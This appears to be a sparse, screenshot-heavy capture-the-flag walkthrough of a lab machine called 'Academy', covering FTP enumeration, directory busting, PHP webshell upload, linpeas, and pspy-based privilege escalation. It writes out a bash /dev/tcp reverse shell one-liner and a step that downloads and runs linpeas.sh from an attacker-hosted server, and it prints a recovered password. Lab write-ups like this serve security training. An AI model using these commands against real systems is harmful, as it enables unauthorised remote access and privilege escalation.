# Academy


	- Explore FTP directory
	- Directory Busting
	- PHP webshell upload
	- LINPEAS
  - Post a web server



![image](https://github.com/user-attachments/assets/8635d0fd-4504-4d7a-b7f9-9939b603d91e)


![image](https://github.com/user-attachments/assets/f118e1c0-0640-481b-b7fd-49744aff0187)


![image](https://github.com/user-attachments/assets/0e2959b3-0c83-4a01-a3b2-62bb85a103dd)



![image](https://github.com/user-attachments/assets/c5e17029-a74b-4c30-90e0-627c48542d32)



![image](https://github.com/user-attachments/assets/c87bec45-3422-4465-a6c1-93aa23688945)


![image](https://github.com/user-attachments/assets/ff023b06-7973-4b99-95ed-eae931517e53)


![image](https://github.com/user-attachments/assets/ae64a03f-8338-475e-9394-db8210ceba21)


![image](https://github.com/user-attachments/assets/aa387874-09a2-4aca-b058-ffa1090e881a)


![image](https://github.com/user-attachments/assets/8bd9dc31-9c58-4077-aaf8-eecf28354cd4)

![image](https://github.com/user-attachments/assets/394eb9ac-abaa-4c6b-ab86-8a31b3732f65)

FFUF

![image](https://github.com/user-attachments/assets/651daf5d-a03d-4762-bde0-6678094c5d25)

![image](https://github.com/user-attachments/assets/75e574b6-f4e9-42f1-9878-cac5bfe6de76)


![image](https://github.com/user-attachments/assets/5fece08c-1f02-4530-a597-ea9a58442bd2)


![image](https://github.com/user-attachments/assets/a479fedc-3bee-4935-a068-494c782020b7)


![image](https://github.com/user-attachments/assets/086b41d9-19ed-449e-83ea-8f7c2906a41d)


![image](https://github.com/user-attachments/assets/619310de-1b29-491e-a6dc-eb18cbaa1cb5)


https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

![image](https://github.com/user-attachments/assets/b8e5a6db-9b9d-4c54-b701-5272c3ee58a2)


![image](https://github.com/user-attachments/assets/0861a6f2-a6d2-4d68-827d-1bf22d3b55e4)



![image](https://github.com/user-attachments/assets/eee41308-8675-47a9-a81a-c9b0ef57b070)



![image](https://github.com/user-attachments/assets/2a6be7d8-5e91-4ba9-8c5f-60f69750c2cf)


![image](https://github.com/user-attachments/assets/cf2f7753-3950-40e5-b8c7-920ae11771ea)

Privilege Escalation

We are not a root user and we need to perform privilege escalation. 

We are going to use LINPEAS tool to do some searching.

LINPEAS is a tool that hunts for privilege escalation.

https://github.com/carlospolop/PEASS-ng/blob/master/linPEAS/README.md

![image](https://github.com/user-attachments/assets/8e3130d9-d8d4-4c17-bc47-38eac8ab94e0)


Post a web server
This will host up a webserver in this folder , we're gonna go and grab this file on this machine. 


![image](https://github.com/user-attachments/assets/07c36ea9-89b5-49e1-890f-0c71120173bc)


Put a file on the machine that we want to grab, put in the tmp folder
![image](https://github.com/user-attachments/assets/80b715ff-0bca-4124-952d-72270a678f67)

![image](https://github.com/user-attachments/assets/39f38074-ed58-4bc6-9cde-9e16d4864490)


http://<attackerIP>/linpeas.sh

![image](https://github.com/user-attachments/assets/c9a92beb-971d-4dfc-aa30-f98798619fb0)


Listener:

![image](https://github.com/user-attachments/assets/5921e7d7-d908-4485-a7ff-2f679565218a)

We need to make it executable
chmod +x linpeas.sh
./linpeas.sh

![image](https://github.com/user-attachments/assets/926cbc65-9846-46f0-a0c6-0ff78bc76abf)


![image](https://github.com/user-attachments/assets/25ed333b-eeea-4205-85c5-134159a6e5f2)

My_V3ryS3cur3_P4ss

![image](https://github.com/user-attachments/assets/26bb2713-cfb4-43ac-95a3-535af607a597)

![image](https://github.com/user-attachments/assets/8a9e13b2-491a-40c2-b1b5-eb36dae44a16)

![image](https://github.com/user-attachments/assets/7349e09d-5074-4419-a4d1-92d5f92d04c7)

![image](https://github.com/user-attachments/assets/1c365686-8086-4029-9630-87da63ec04a5)


![image](https://github.com/user-attachments/assets/d4c7d063-7bda-464b-b518-5cd93f8a494d)


![image](https://github.com/user-attachments/assets/a5cf8ab8-d3e5-4bf7-bb22-4e7cfbe5afde)

![image](https://github.com/user-attachments/assets/0d3bcf8d-6a63-4ee5-80ed-0064d37d5842)


![image](https://github.com/user-attachments/assets/8c4aa7e1-b47a-469e-b27f-fb264dd3546e)


![image](https://github.com/user-attachments/assets/d454221f-c462-4b29-8ecb-b5a3825eceff)

![image](https://github.com/user-attachments/assets/129772fe-7454-4edb-9e48-1136256f092c)


pspy - monitor linux processes without root permissions

![image](https://github.com/user-attachments/assets/9674f183-228c-4591-b30f-22f71a4d38df)

![image](https://github.com/user-attachments/assets/0f9ad671-40ad-4f67-a32f-392d2e4f6339)


Put the pspy here in the tmp folder and run it

![image](https://github.com/user-attachments/assets/918386bc-d49e-496c-b298-be143616c27b)

![image](https://github.com/user-attachments/assets/c87e5de6-bea9-470a-9e07-69580ed3c6cd)


This will show us all the processes running on the machine


![image](https://github.com/user-attachments/assets/a8b361e3-cbc5-471b-8e6b-ca4915f5c743)

![image](https://github.com/user-attachments/assets/c861d002-e529-4086-936f-58c16633fc30)


Reverse shell oneliner

https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

![image](https://github.com/user-attachments/assets/68ab4586-cc59-4bce-bb75-37e5c36f17cc)

![image](https://github.com/user-attachments/assets/f7c0ae4f-b48a-44dc-86af-5cc947359890)


![image](https://github.com/user-attachments/assets/239e4247-6ae2-4f09-b217-7c214d8cdf84)

We're going to put that in there and when it executes, it's going to perform reverse shell.  

bash -i >& /dev/tcp/10.0.0.1/8080 0>&1   substitute attackerIP


![image](https://github.com/user-attachments/assets/3947d795-3540-45c5-a9fd-68dc046b92c2)


![image](https://github.com/user-attachments/assets/6fc026b3-b7ba-4fa8-b282-f509e9d320c9)















